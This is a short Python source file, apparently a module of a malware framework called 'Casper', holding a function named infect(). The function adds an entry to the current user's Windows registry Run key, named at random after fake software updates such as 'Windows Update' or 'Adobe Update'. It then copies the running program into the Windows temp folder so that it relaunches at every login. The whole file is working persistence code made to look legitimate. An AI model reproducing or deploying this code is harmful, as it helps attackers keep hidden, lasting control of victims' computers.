"""
Part of Casper Framework
"""
from includes import *

def infect():
	value_names = ["Adobe Update","Microsoft Update",
				"Windows Update","OneDrive Update",
				"Acrobat Reader Plugin","Outlook Plugin",
				"Microsoft Office Update","Google Chrome Update"]
	
	try:
		logging.debug("[casper] Starting registry infection")
		key = r"Software\Microsoft\Windows\CurrentVersion\Run"
		open = OpenKey(HKEY_CURRENT_USER,key,0,KEY_ALL_ACCESS)
		SetValueEx(open,random.choice(value_names),0,REG_SZ,"%systemroot%\\temp\\"+sys.argv[0])
	except Exception as e:
		return False
	try:
		shutil.copyfile(os.path.join(os.getcwd(),sys.argv[0]),"c:\\windows\\temp\\"+sys.argv[0])
	except Exception as e:
		return False
		
	logging.debug("[casper] Finished registry infection")
	return True